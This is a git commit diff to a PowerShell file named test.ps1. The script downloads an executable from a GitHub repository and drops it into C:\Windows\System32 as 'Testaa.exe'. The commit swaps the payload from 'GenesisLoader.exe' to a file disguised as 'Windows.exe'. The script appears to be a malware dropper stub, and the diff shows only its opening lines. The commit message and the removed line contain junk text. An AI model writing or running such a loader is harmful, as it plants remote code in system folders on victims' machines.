120b0fc5f6e52461c09a2fdbef355bef2428fbce
RollbakIsOnline <Rollbak+1@proton.me>
2025-12-31 08:36:08 +0100

    Update executable URL in test.ps1Skibidi

--- test.ps1
+++ test.ps1
@@ -1,6 +1,6 @@
-$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/main/GenesisLoader.exe"
+$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/blob/main/Windows.exe"
 $exePath = "C:\Windows\System32\Testaa.exe"
-zizi
+
 Write-Host "Downloading..." -ForegroundColor Cyan
 
 $wc = New-Object System.Net.WebClient
